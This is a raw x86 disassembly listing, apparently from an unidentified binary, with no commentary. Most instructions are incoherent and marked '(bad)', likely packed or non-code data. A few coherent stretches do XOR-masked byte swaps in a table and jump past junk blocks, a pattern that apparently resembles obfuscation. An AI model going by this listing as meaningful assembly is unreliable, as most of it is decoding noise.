  408cdc:	test   eax,0x1045b3d5
  408ce1:	pop    edx
  408ce2:	push   ecx
  408ce3:	xchg   esp,eax
  408ce4:	(bad)  
  408ce5:	popa   
  408ce6:	imul   eax
  408ce8:	dec    esi
  408ce9:	retf   
  408cea:	icebp  
  408ceb:	pop    ds
  408cec:	pop    ecx
  408ced:	xor    BYTE PTR [ebp+0x2c],ah
  408cf0:	test   DWORD PTR ds:0x7311585f,edi
  408cf6:	lea    edx,[ebx+0x6c]
  408cf9:	push   ebx
  408cfa:	pop    ebp
  408cfb:	cmc    
  408cfc:	add    eax,0x1ac984bc
  408d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d02:	and    ebp,DWORD PTR [edi]
  408d04:	mov    edx,0x7e7520e3
  408d09:	ss iret 
  408d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0c:	xchg   edi,eax
  408d0d:	shr    BYTE PTR [edi-0x7e],0xb0
  408d11:	mov    ecx,0x7f149a67
  408d16:	out    dx,al
  408d17:	sahf   
  408d18:	rcr    edi,cl
  408d1a:	inc    edx
  408d1b:	xchg   edi,eax
  408d1c:	fcmovbe st,st(1)
  408d1e:	loopne 0x408ce5
  408d20:	or     DWORD PTR [esi],0x12
  408d23:	xchg   bh,cl
  408d25:	sub    BYTE PTR [esi+0x1a],bh
  408d28:	and    bh,BYTE PTR [eax]
  408d2a:	xchg   ebx,eax
  408d2b:	cdq    
  408d2c:	out    0x32,al
  408d2e:	sub    esp,DWORD PTR [edi+0x5b0a53e]
  408d34:	inc    ecx
  408d35:	pop    edx
  408d36:	xor    dh,ah
  408d38:	mov    WORD PTR [edi+edx*2-0x4b],?
  408d3c:	dec    ebp
  408d3d:	push   eax
  408d3e:	add    bl,ch
  408d40:	add    dl,BYTE PTR [edi]
  408d42:	pop    es
  408d43:	adc    DWORD PTR [edi+0x40d2dd38],edi
  408d49:	loope  0x408cdc
  408d4b:	mov    edx,DWORD PTR [ebx-0x70]
  408d4e:	adc    DWORD PTR [eax+0x48f49349],edx
  408d54:	inc    esp
  408d55:	mov    ebp,0x2afbe061
  408d5a:	push   edx
  408d5b:	cmp    eax,DWORD PTR [esi]
  408d5d:	into   
  408d5e:	xlat   BYTE PTR ds:[ebx]
  408d5f:	mov    ds:0xc79d5707,eax
  408d64:	push   0xb36669e3
  408d69:	dec    edx
  408d6a:	mov    al,0x6
  408d6c:	mov    ds:0xe32c363a,eax
  408d71:	aaa    
  408d72:	xor    dl,bl
  408d74:	push   esp
  408d75:	sti    
  408d76:	lods   al,BYTE PTR ds:[esi]
  408d77:	ret    
  408d78:	cmp    ah,cl
  408d7a:	sbb    BYTE PTR [edi+0x1378def5],dl
  408d80:	adc    al,0x3
  408d82:	inc    eax
  408d83:	jl     0x408d06
  408d85:	mov    BYTE PTR [ebp-0x1d],cl
  408d88:	ins    DWORD PTR es:[edi],dx
  408d89:	dec    eax
  408d8a:	ret    
  408d8b:	inc    ebx
  408d8c:	or     cl,BYTE PTR [edi-0x648cf149]
  408d92:	jle    0x408d65
  408d94:	mov    edx,DWORD PTR [ebp-0xc]
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	jae    0x408dc6
  408dbc:	neg    edi
  408dbe:	xchg   ebx,eax
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0x521ac670
  408dc9:	test   BYTE PTR [edi],dl
  408dcb:	in     eax,0x49
  408dcd:	cld    
  408dce:	jo     0x408e4b
  408dd0:	stos   BYTE PTR es:[edi],al
  408dd1:	mov    bl,0x27
  408dd3:	int3   
  408dd4:	fstp   TBYTE PTR [edx+0x26]
  408dd7:	into   
  408dd8:	mov    ebp,0x20059669
  408ddd:	cmp    BYTE PTR [edi+0x2],dl
  408de0:	retf   
  408de1:	(bad)
  408de4:	sar    BYTE PTR [esi+0x42],1
  408de7:	cdq    
  408de8:	jg     0x408dd0
  408dea:	sbb    al,bh
  408dec:	xor    dl,BYTE PTR [edi]
  408dee:	add    eax,0x7fd019a1
  408df3:	gs retf 
  408df5:	dec    esp
  408df6:	pop    ds
  408df7:	fdiv   QWORD PTR [eax-0x2dd93b6c]
  408dfd:	mov    ebx,0x7ccb6193
  408e02:	jecxz  0x408e22
  408e04:	call   0xd47e0c5e
  408e09:	ins    DWORD PTR es:[edi],dx
  408e0a:	xchg   esi,eax
  408e0b:	sbb    eax,0xd71bcc53
  408e10:	xchg   ecx,eax
  408e11:	not    DWORD PTR [ebx-0x68ca333e]
  408e17:	cdq    
  408e18:	aad    0xd6
  408e1a:	lods   eax,DWORD PTR ds:[esi]
  408e1c:	pushw  cs
  408e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e1f:	lods   al,BYTE PTR ds:[esi]
  408e20:	mov    bl,0x20
  408e22:	lea    ecx,[ebp+0x2d29e411]
  408e28:	dec    esi
  408e29:	or     DWORD PTR [ebp+0x753cb899],eax
  408e2f:	leave  
  408e30:	cmp    ebp,edx
  408e32:	cli    
  408e33:	in     eax,dx
  408e34:	jmp    0x408e4d
  408e36:	sub    BYTE PTR [esi+0x6ed29ae6],ah
  408e3c:	in     al,dx
  408e3d:	jno    0x408dd1
  408e3f:	add    WORD PTR [ecx+0x6c],dx
  408e43:	adc    eax,0x728cbc4c
  408e48:	jae    0x408e42
  408e4a:	out    0x91,al
  408e4c:	mov    bl,0xe7
  408e4e:	js     0x408e96
  408e50:	cmp    BYTE PTR [ebx+0x76],ch
  408e53:	pop    ds
  408e54:	inc    ebx
  408e55:	loopne 0x408df7
  408e57:	push   ebx
  408e58:	fldl2t 
  408e5a:	arpl   WORD PTR [ebx],si
  408e5c:	push   es
  408e5d:	leave  
  408e5e:	xor    eax,0xfbc755cf
  408e63:	clc    
  408e64:	call   0xb7831962
  408e69:	scas   eax,DWORD PTR es:[edi]
  408e6a:	ror    DWORD PTR [ecx],cl
  408e6c:	push   esp
  408e6d:	push   edi
  408e6e:	mov    esp,0x248eccc1
  408e73:	inc    edi
  408e74:	xchg   DWORD PTR [edx+eiz*1],edi
  408e77:	lahf   
  408e78:	je     0x408ef6
  408e7a:	das    
  408e7b:	push   ebp
  408e7c:	cmp    DWORD PTR [ebx-0x58],ebp
  408e7f:	(bad)  
  408e80:	sbb    bh,dh
  408e82:	and    BYTE PTR [ebx-0x34],dh
  408e85:	and    bl,BYTE PTR [esi-0x1b6343d8]
  408e8b:	xor    edx,edi
  408e8d:	addr16 jno 0x408ec7
  408e90:	scas   eax,DWORD PTR es:[edi]
  408e91:	push   ds
  408e92:	cmp    cl,BYTE PTR [edx+0x33]
  408e95:	sbb    eax,0x11521b3b
  408e9a:	es jecxz 0x408eb5
  408e9d:	mov    eax,ds:0x98137edd
  408ea2:	jno    0x408e63
  408ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea5:	retf   
  408ea6:	xchg   edi,eax
  408ea7:	jle    0x408f19
  408ea9:	mov    eax,ds:0x378d35ae
  408eae:	out    0xf3,eax
  408eb0:	cld    
  408eb1:	add    DWORD PTR [ebp-0x4],esp
  408eb4:	test   al,0x7
  408eb6:	push   edx
  408eb7:	enter  0xbe4c,0x1f
  408ebb:	mov    ecx,0x15176566
  408ec0:	enter  0x6ea5,0xf1
  408ec4:	adc    al,0x43
  408ec6:	dec    ebp
  408ec7:	imul   ebx,esp,0x2a
  408eca:	ror    cl,cl
  408ecc:	mov    ah,0x3c
  408ece:	inc    ebp
  408ecf:	retf   0x2ff
  408ed2:	cmp    DWORD PTR [esi-0x4f],edx
  408ed5:	mov    eax,0x9b6d2be7
  408eda:	dec    ecx
  408edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408edc:	test   dl,bh
  408ede:	scas   al,BYTE PTR es:[edi]
  408edf:	les    eax,FWORD PTR ss:[edi]
  408ee2:	sub    BYTE PTR [esi-0x6fd49464],bl
  408ee8:	icebp  
  408ee9:	ret    
  408eea:	inc    ebp
  408eeb:	pop    ss
  408eec:	pop    ss
  408eed:	(bad)  
  408eee:	xchg   ebx,eax
  408eef:	jb     0x85ffba07
  408ef5:	loopne 0x408f4b
  408ef7:	fwait
  408ef8:	jmp    0x6572c441
  408efd:	jmp    0x75ec27ce
  408f02:	xchg   edx,eax
  408f03:	shl    DWORD PTR [edx-0x53],0xcd
  408f07:	push   ecx
  408f08:	or     eax,0x9106cbdb
  408f0d:	mov    esi,0x69096db3
  408f12:	fst    DWORD PTR [esp+ebp*4]
  408f15:	dec    edi
  408f16:	ins    DWORD PTR es:[edi],dx
  408f17:	out    0xac,al
  408f19:	jmp    0x43dbd623
  408f1e:	sub    DWORD PTR [edx+0x7011a36],ebp
  408f24:	test   DWORD PTR [ebp+0x74],edi
  408f27:	mov    bl,0x9b
  408f29:	bound  ebp,QWORD PTR [ebx*2-0x7bbecd7f]
  408f30:	pop    edx
  408f31:	dec    eax
  408f32:	mul    DWORD PTR [ebx-0x3c]
  408f35:	pop    ecx
  408f36:	xor    BYTE PTR [edx+0x63],dh
  408f39:	iret   
  408f3a:	mov    ebp,0xed5a71f0
  408f3f:	sbb    ch,BYTE PTR ds:0x499111c1
  408f45:	ret    0x80fe
  408f48:	jp     0x408edc
  408f4a:	and    bl,BYTE PTR [ebx+0x2c]
  408f4d:	jo     0x408fb6
  408f4f:	mov    ebx,0x54731bb3
  408f54:	xacquire xchg BYTE PTR [edx-0x5d867a37],ah
  408f5b:	and    DWORD PTR [ebx],edx
  408f5d:	inc    esi
  408f5e:	dec    esi
  408f5f:	add    al,dl
  408f61:	adc    BYTE PTR [ebx+0x28],cl
  408f64:	gs js  0x408f3a
  408f67:	into   
  408f68:	fist   DWORD PTR [esp+edi*1]
  408f6b:	neg    DWORD PTR [eax-0x15450e8a]
  408f71:	jmp    0x6a42:0x357e331f
  408f78:	cmp    al,0xfa
  408f7a:	sbb    al,0x43
  408f7c:	test   eax,0x35846c7f
  408f81:	pop    eax
  408f82:	mov    bh,0x36
  408f84:	cwde   
  408f85:	dec    ebp
  408f86:	mov    cl,0x7a
  408f88:	xor    DWORD PTR [ecx+0x72],esi
  408f8b:	or     BYTE PTR [edx+0x4e],al
  408f8e:	mov    esp,0x3a862d9e
  408f93:	jge    0x408fbe
  408f95:	sub    DWORD PTR gs:[eax],ebp
  408f98:	push   ecx
  408f99:	mov    eax,0x273315fe
  408f9e:	push   0x57f5abe
  408fa3:	shl    esp,0x7a
  408fa6:	xor    eax,0xfefe4a99
  408fab:	or     al,0xd0
  408fad:	test   BYTE PTR [ecx],0xa3
  408fb0:	mov    ah,0xfd
  408fb2:	xlat   BYTE PTR ds:[ebx]
  408fb3:	mov    eax,0x73f819cb
  408fb8:	mov    esi,0xe305fa47
  408fbd:	mov    dl,BYTE PTR [ebp+0xf]
  408fc0:	mov    edi,DWORD PTR [ebp-0xc]
  408fc3:	xor    edi,eax
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	test   eax,0x8cb844bb
  409009:	fdiv   QWORD PTR [eax+0x70]
  40900c:	imul   edi,DWORD PTR [edi+0x70],0x2b001170
  409013:	cdq    
  409014:	jl     0x409095
  409016:	loopne 0x408fab
  409018:	mov    al,ds:0x6fa580a3
  40901d:	adc    BYTE PTR [ebp-0x2972159d],dh
  409023:	seta   BYTE PTR [ebx-0x55]
  409027:	cmp    al,0xde
  409029:	aam    0x47
  40902b:	inc    ecx
  40902c:	(bad)  
  40902d:	xchg   esp,eax
  40902e:	mov    eax,ds:0x3000c225
  409033:	jnp    0x408fb6
  409035:	jns    0x40905b
  409037:	push   edi
  409038:	test   eax,0x9318fbd0
  40903d:	xchg   esi,ebx
  40903f:	sbb    BYTE PTR [ecx-0x760a3d8d],dh
  409045:	inc    edi
  409047:	scas   eax,DWORD PTR es:[edi]
  409048:	push   0x925acb6
  40904d:	dec    ebp
  40904e:	out    dx,al
  40904f:	fstp   QWORD PTR [ebx+0x1]
  409052:	or     ecx,DWORD PTR [esi-0x5bb611d]
  409058:	jp     0x4090ba
  40905a:	jp     0x409060
  40905c:	cmp    BYTE PTR [eax],dl
  40905e:	loope  0x40909a
  409060:	fisubr WORD PTR [edx-0x6f]
  409063:	js     0x409057
  409065:	clc    
  409066:	int3   
  409067:	(bad)  
  409068:	push   edx
  409069:	cwde   
  40906a:	mov    WORD PTR [edi],ss
  40906c:	js     0x40909d
  40906e:	fisubr DWORD PTR [edx-0x3f]
  409071:	jl     0x4090c6
  409073:	je     0x408ff7
  409075:	xchg   BYTE PTR [ecx-0x65],bh
  409078:	sub    DWORD PTR [edx+0x17a0989],ecx
  40907e:	mov    BYTE PTR ds:0x4e20881f,bl
  409084:	(bad)  [eax+0x6a57620e]
  40908a:	push   eax
  40908b:	push   edx
  40908c:	ror    DWORD PTR [eax],1
  40908e:	xor    dh,BYTE PTR ds:0xd9253aa6
  409094:	popf   
  409095:	out    dx,al
  409096:	add    ch,BYTE PTR [ecx+0x2b9e952]
  40909c:	mov    cl,0x1a
  40909e:	pop    ss
  40909f:	dec    ecx
  4090a0:	leave  
  4090a1:	out    0x91,eax
  4090a3:	(bad)  
  4090a4:	fldcw  WORD PTR [esi]
  4090a6:	pop    edi
  4090a7:	std    
  4090a8:	inc    esi
  4090a9:	out    dx,eax
  4090aa:	jge    0x4090f7
  4090ac:	push   eax
  4090ad:	call   0x8a99f238
  4090b2:	cmp    DWORD PTR [ebp+eax*2-0x691d81f7],esp
  4090b9:	sbb    BYTE PTR [eax],0x13
  4090bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090be:	push   ss
  4090bf:	adc    eax,0xe51a7ee8
  4090c4:	xchg   ecx,eax
  4090c5:	je     0x409049
  4090c7:	and    eax,0x7f199c10
  4090cc:	or     dh,BYTE PTR [ecx+0x1b]
  4090cf:	js     0x409130
  4090d1:	ja     0x4090d6
  4090d3:	and    dh,BYTE PTR [ecx+0x6f]
  4090d6:	pop    ss
  4090d7:	pop    esi
  4090d8:	jae    0x40911a
  4090da:	add    dh,BYTE PTR [ebp-0x699316d1]
  4090e0:	mov    DWORD PTR [ebx+0x38d307be],edx
  4090e6:	cmp    al,0x25
  4090e8:	and    al,BYTE PTR [edx+0x163b32da]
  4090ee:	aas    
  4090ef:	sub    al,0xa1
  4090f1:	js     0x409126
  4090f3:	mov    ch,0xb1
  4090f5:	sbb    dl,BYTE PTR [eax+0x3c7ffa16]
  4090fb:	and    DWORD PTR [ebp-0x37],edi
  4090fe:	cmp    ah,BYTE PTR [esp+esi*1+0x2ba14b42]
  409105:	inc    eax
  409106:	xor    bl,BYTE PTR [ecx]
  409108:	je     0x409124
  40910a:	sub    al,0x7e
  40910c:	out    dx,eax
  40910d:	cmp    ebp,0x2294a8b
  409113:	mov    bl,0x53
  409115:	sub    dh,bh
  409117:	paddsw mm2,mm1
  40911a:	push   ebx
  40911b:	ds jne 0x409197
  40911e:	int3   
  40911f:	outs   dx,BYTE PTR ds:[esi]
  409120:	inc    esi
  409121:	loope  0x4090c0
  409123:	shl    dh,0xca
  409126:	mov    ebp,0x491417cd
  40912b:	loop   0x4090f4
  40912d:	mov    ebx,0xd26a00a3
  409132:	clc    
  409133:	fs cmp al,0x1d
  409136:	call   0x9297:0x8af13373
  40913d:	add    cl,BYTE PTR [eax]
  40913f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409140:	fbstp  TBYTE PTR [esi]
  409142:	cmp    al,0x57
  409144:	jns    0x4090f8
  409146:	push   ss
  409147:	sbb    BYTE PTR [ecx+edi*8],dl
  40914a:	mov    edx,0x3fd77873
  40914f:	add    DWORD PTR ds:[edx+edx*2+0x868d4fb],ebx
  409157:	sub    BYTE PTR [eax-0x61],dl
  40915a:	add    DWORD PTR [ebp+0x2],eax
  40915d:	pextrw esi,(bad),0xc5
  40915f:	mov    bh,0x7e
  409161:	add    DWORD PTR [ecx-0x36],0xffffffee
  409165:	jo     0x4091e5
  409167:	pop    es
  409168:	jns    0x4091bf
  40916a:	stos   BYTE PTR es:[edi],al
  40916b:	test   BYTE PTR [edx],bh
  40916d:	jbe    0x409181
  40916f:	in     eax,dx
  409170:	out    0xf1,al
  409172:	dec    esp
  409173:	fisubr WORD PTR [ebp-0x44b6c363]
  409179:	push   ebp
  40917a:	outs   dx,BYTE PTR ds:[esi]
  40917b:	icebp  
  40917c:	mov    esp,0xe674f5fd
  409181:	stc    
  409182:	lods   eax,DWORD PTR ds:[esi]
  409183:	push   0xffffff88
  409185:	leave  
  409186:	mov    ch,0xa3
  409188:	mov    edx,edi
  40918a:	ret    0xaf8d
  40918d:	test   eax,0x841b3fc6
  409192:	add    edi,esp
  409194:	aam    0x82
  409196:	fcom   DWORD PTR [ebp-0x135e50c1]
  40919c:	leave  
  40919d:	int3   
  40919e:	and    esp,DWORD PTR [ecx-0x174cd6f0]
  4091a4:	test   eax,0x640f2a00
  4091a9:	arpl   WORD PTR [eax+edx*4+0x23984677],sp
  4091b0:	sbb    DWORD PTR [esp+0x736d1907],ebx
  4091b7:	imul   ecx,DWORD PTR [ebp-0x56],0xf20ed933
  4091be:	xchg   BYTE PTR [ebx*1-0x5ae24046],dl
  4091c5:	and    ch,BYTE PTR [ebp-0x16dcbc6c]
  4091cb:	sub    eax,DWORD PTR [esi-0x60]
  4091ce:	add    al,0x66
  4091d0:	jae    0x40917a
  4091d2:	fild   DWORD PTR [ecx-0x1fcaac3]
  4091d8:	sahf   
  4091d9:	push   edi
  4091da:	test   BYTE PTR [edi],bl
  4091dc:	mov    ebx,0xe3256418
  4091e1:	ins    DWORD PTR es:[edi],dx
  4091e2:	xchg   esp,eax
  4091e3:	retf   
  4091e4:	dec    edx
  4091e5:	hlt    
  4091e6:	lds    esi,FWORD PTR ds:0x9ad28e26
  4091ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ed:	sbb    esp,DWORD PTR [esi]
  4091ef:	in     eax,dx
  4091f0:	ss jp  0x4091cb
  4091f3:	xchg   DWORD PTR [eax],ebp
  4091f5:	mov    ebp,0x39050afc
  4091fa:	mov    DWORD PTR [eax],ecx
  4091fc:	push   ecx
  4091fd:	outs   dx,BYTE PTR ds:[esi]
  4091fe:	push   cs
  4091ff:	(bad)
  409202:	je     0x409187
  409204:	inc    ecx
  409205:	cs mov dl,0x3
  409208:	stc    
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	mov    dh,0x2
  40921c:	inc    edi
  40921d:	pop    ds
  40921e:	test   edx,ebx
  409220:	jo     0x409292
  409222:	imul   edi,DWORD PTR [edi+0x70],0x387d170
  409229:	sbb    esi,ebx
  40922b:	shl    al,1
  40922d:	add    al,0x92
  40922f:	push   edx
  409230:	sbb    BYTE PTR ds:0xd6743ab7,bl
  409236:	das    
  409237:	fdiv   QWORD PTR [ebp-0x78c19474]
  40923d:	cdq    
  40923e:	push   edx
  40923f:	push   edx
  409240:	mov    ah,BYTE PTR [esi-0x77]
  409243:	mov    edi,0x866dbaa
  409248:	aad    0xa8
  40924a:	fwait
  40924b:	xor    dl,ch
  40924d:	ins    DWORD PTR es:[edi],dx
  40924e:	lods   eax,DWORD PTR ds:[esi]
  40924f:	cmp    ecx,edx
  409251:	pop    edi
  409252:	popa   
  409253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409254:	ret    
  409255:	inc    esp
  409256:	jmp    0x95972ccc
  40925b:	cmp    al,0xf9
  40925d:	and    eax,0x87f6d081
  409262:	(bad)  
  409263:	in     eax,dx
  409264:	push   ebx
  409265:	(bad)  
  409266:	in     al,0x6e
  409268:	loopne 0x40922b
  40926a:	shl    BYTE PTR [esi+0x6ab92bb8],1
  409270:	or     al,0x1a
  409272:	(bad)  
  409273:	mov    cl,0x7a
  409275:	cmc    
  409276:	push   eax
  409277:	aad    0x12
  409279:	maxps  xmm4,XMMWORD PTR [ecx+ebx*4-0x3f]
  40927e:	sub    eax,DWORD PTR [ecx+0xcb367ce]
  409284:	cmp    al,0xd
  409286:	pop    es
  409287:	mov    BYTE PTR [edi],bh
  409289:	xor    al,BYTE PTR [edi]
  40928b:	mov    cl,0xf4
  40928d:	pushf  
  40928e:	add    DWORD PTR [eax+ebx*1+0x1206a0e6],eax
  409295:	shr    BYTE PTR [esi],0x92
  409298:	pop    ebx
  409299:	shr    DWORD PTR [esi+0x1f],0x8d
  40929d:	or     DWORD PTR [ebx-0x577305d4],ebx
  4092a3:	adc    DWORD PTR [ecx-0x8],esp
  4092a6:	popf   
  4092a7:	in     eax,0x5c
  4092a9:	loop   0x409280
  4092ab:	dec    ecx
  4092ac:	mov    bl,0x26
  4092ae:	push   0xffffff85
  4092b0:	scas   al,BYTE PTR es:[edi]
  4092b1:	data16 arpl WORD PTR [esi],di
  4092b4:	xchg   ecx,eax
  4092b5:	jle    0x409241
  4092b7:	popf   
  4092b8:	pop    ecx
  4092b9:	sbb    BYTE PTR [ebx+0x3e],bl
  4092bc:	div    al
  4092be:	inc    ebp
  4092bf:	sub    edx,DWORD PTR [eax]
  4092c1:	nop
  4092c2:	ror    BYTE PTR [ecx-0x22c15069],0x70
  4092c9:	push   ss
  4092ca:	leave  
  4092cb:	stc    
  4092cc:	fnstsw WORD PTR [eax]
  4092ce:	pop    es
  4092cf:	out    0x7f,al
  4092d1:	inc    ebx
  4092d2:	dec    ecx
  4092d3:	cmp    bh,BYTE PTR [edi-0xdc0a0d9]
  4092d9:	sub    eax,ebx
  4092db:	xchg   esi,eax
  4092dc:	cs xor al,0x9d
  4092df:	sar    BYTE PTR [edi-0x2c],1
  4092e2:	pop    edx
  4092e3:	dec    esp
  4092e4:	jnp    0x4092e7
  4092e6:	leave  
  4092e7:	test   eax,0x8c8e35fb
  4092ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ed:	jecxz  0x409355
  4092ef:	dec    esi
  4092f0:	in     eax,dx
  4092f1:	fwait
  4092f2:	add    ch,BYTE PTR [ebp+0x12]
  4092f5:	push   ebx
  4092f6:	ret    
  4092f7:	popf   
  4092f8:	in     eax,dx
  4092f9:	adc    BYTE PTR [edi+eax*1-0x69],ah
  4092fd:	aas    
  4092fe:	mov    esp,ebp
  409300:	stc    
  409301:	das    
  409302:	jmp    0x4cc6:0xbd1ea14
  409309:	dec    ecx
  40930a:	mov    eax,0xe7062b94
  40930f:	and    dh,0x73
  409312:	mov    ebp,cs
  409314:	fdiv   QWORD PTR [ebx-0x36]
  409317:	popa   
  409318:	jmp    0x40933f
  40931a:	call   0x122e7e92
  40931f:	inc    esp
  409320:	mov    bl,0x67
  409322:	xor    dh,BYTE PTR ss:[edi]
  409325:	xchg   esp,eax
  409326:	fsub   QWORD PTR [esi-0x6901c252]
  40932c:	mov    al,0xfb
  40932e:	cmp    eax,0xaf1eda53
  409333:	xor    BYTE PTR [ecx-0x2a],cl
  409336:	iret   
  409337:	jae    0x40939d
  409339:	test   DWORD PTR [edi-0x7f],ecx
  40933c:	dec    ebx
  40933d:	xchg   ebx,eax
  40933e:	out    0xb9,al
  409340:	xor    DWORD PTR [ecx],esp
  409342:	je     0x409379
  409344:	mov    DWORD PTR [ebp-0x50],ebp
  409347:	push   eax
  409348:	bnd jnp 0x4093ab
  40934b:	fmul   DWORD PTR [edi]
  40934d:	(bad)  
  40934e:	jmp    0x40930b
  409350:	rcl    BYTE PTR [ecx+0x4c127f88],cl
  409356:	pop    edi
  409357:	jl     0x409304
  409359:	sub    DWORD PTR [ebx+0x2f546998],0xffffffaf
  409360:	shr    BYTE PTR [edi+eax*8-0x3407a174],1
  409367:	stc    
  409368:	pop    eax
  409369:	mov    bh,0x55
  40936b:	out    dx,eax
  40936c:	xchg   ebp,eax
  40936d:	xlat   BYTE PTR ds:[ebx]
  40936e:	ins    BYTE PTR es:[edi],dx
  40936f:	nop
  409370:	sub    dh,BYTE PTR [edi+0x14]
  409373:	ret    0xc9b3
  409376:	mov    ebp,0x38114795
  40937b:	(bad)
  409380:	lahf   
  409381:	ins    DWORD PTR es:[edi],dx
  409382:	xlat   BYTE PTR ds:[ebx]
  409383:	push   es
  409384:	jb     0x4093dc
  409386:	cmp    al,0xaa
  409388:	cmp    al,BYTE PTR [ebp-0x4ae7ab0f]
  40938e:	ins    BYTE PTR es:[edi],dx
  40938f:	lods   eax,DWORD PTR ds:[esi]
  409390:	imul   edx,DWORD PTR [ebp-0x53],0xffffffcc
  409394:	dec    eax
  409395:	mov    cl,0x2e
  409397:	dec    eax
  409398:	cwde   
  409399:	jmp    0x409323
  40939b:	test   al,0x4c
  40939d:	sbb    BYTE PTR [edi],dh
  40939f:	ins    DWORD PTR es:[edi],dx
  4093a0:	arpl   WORD PTR [edx+0xa],si
  4093a3:	ja     0x409325
  4093a5:	cmp    al,0x4b
  4093a7:	xor    ebx,edi
  4093a9:	ja     0x40941e
  4093ab:	loope  0x4093a6
  4093ad:	mov    ebp,0x3b4cda8f
  4093b2:	ss add eax,ebp
  4093b5:	lock ds xchg esp,eax
  4093b8:	pop    ecx
  4093b9:	xchg   ebx,eax
  4093ba:	out    0xc5,eax
  4093bc:	fcomp  QWORD PTR [edx-0xa]
  4093c0:	jmp    0x409343
  4093c2:	popf   
  4093c3:	sub    al,dl
  4093c5:	sti    
  4093c6:	cmp    DWORD PTR [edx-0x480cec54],0x12a92dbb
  4093d0:	scas   al,BYTE PTR es:[edi]
  4093d1:	pop    ebx
  4093d2:	imul   esp,ebx,0x64
  4093d5:	adc    al,0x1f
  4093d7:	jmp    0x4093d1
  4093d9:	(bad)  
  4093db:	sub    ah,BYTE PTR [ebp-0x6e11f56b]
  4093e1:	pop    edx
  4093e2:	imul   ebx,DWORD PTR [ebx],0x27871f84
  4093e8:	inc    esi
  4093e9:	jo     0x4093cf
  4093eb:	popf   
  4093ec:	inc    edi
  4093ed:	sti    
  4093ee:	dec    edx
  4093ef:	cdq    
  4093f0:	cld    
  4093f1:	jnp    0x40941e
  4093f3:	adc    DWORD PTR [edi+0x41fa3e8],esi
  4093f9:	add    BYTE PTR [esi],ah
  4093fb:	jmp    0x77840ed8
  409400:	jnp    0x4093ac
  409402:	and    eax,DWORD PTR [ebx+0x31ce6595]
  409408:	jmp    0x38b99c34
  40940d:	cmc    
  40940e:	fwait
  40940f:	pop    esp
  409410:	xor    DWORD PTR [ecx],ebp
  409412:	mov    cl,0x6e
  409414:	mov    eax,0x448de4b6
  409419:	jns    0x40944d
  40941b:	repz daa 
  40941d:	imul   edx,edi
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx+0x6dda1fed]
  409433:	(bad)  
  409434:	xlat   BYTE PTR ds:[ebx]
  409435:	(bad)  
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0x1658170
  409440:	outs   dx,BYTE PTR ds:[esi]
  409441:	mov    bl,0xae
  409443:	int3   
  409444:	in     al,0x13
  409446:	addr16 (bad) 
  409448:	mov    ecx,0xdef628c
  40944d:	or     esi,DWORD PTR [ebx+0x3396829c]
  409453:	mov    dl,cl
  409455:	call   0x63704e6f
  40945a:	mov    dh,0x3e
  40945c:	adc    ah,ch
  40945e:	test   BYTE PTR [eax],dh
  409460:	mov    ebp,0xd27ecab0
  409465:	push   ds
  409466:	ja     0x40947b
  409468:	repz fild DWORD PTR [esi+0x3bcbe5ce]
  40946f:	ss mov edi,0xb31fd100
  409475:	adc    esp,ecx
  409477:	imul   esi,DWORD PTR [edi+edx*4],0xffffffda
  40947b:	sti    
  40947c:	std    
  40947d:	mov    eax,0x8781c9fb
  409482:	push   es
  409483:	test   BYTE PTR [esi],ah
  409485:	mov    ebp,0x228b15e8
  40948a:	sahf   
  40948b:	inc    esp
  40948c:	inc    esi
  40948d:	out    dx,eax
  40948e:	fsub   st,st(6)
  409490:	mov    DWORD PTR [esi+0x9],eax
  409493:	(bad)  
  409495:	gs je  0x4094ad
  409498:	push   ds
  409499:	jecxz  0x40941c
  40949b:	iret   
  40949c:	pop    esp
  40949d:	scas   eax,DWORD PTR es:[edi]
  40949e:	das    
  40949f:	into   
  4094a0:	sbb    ecx,esi
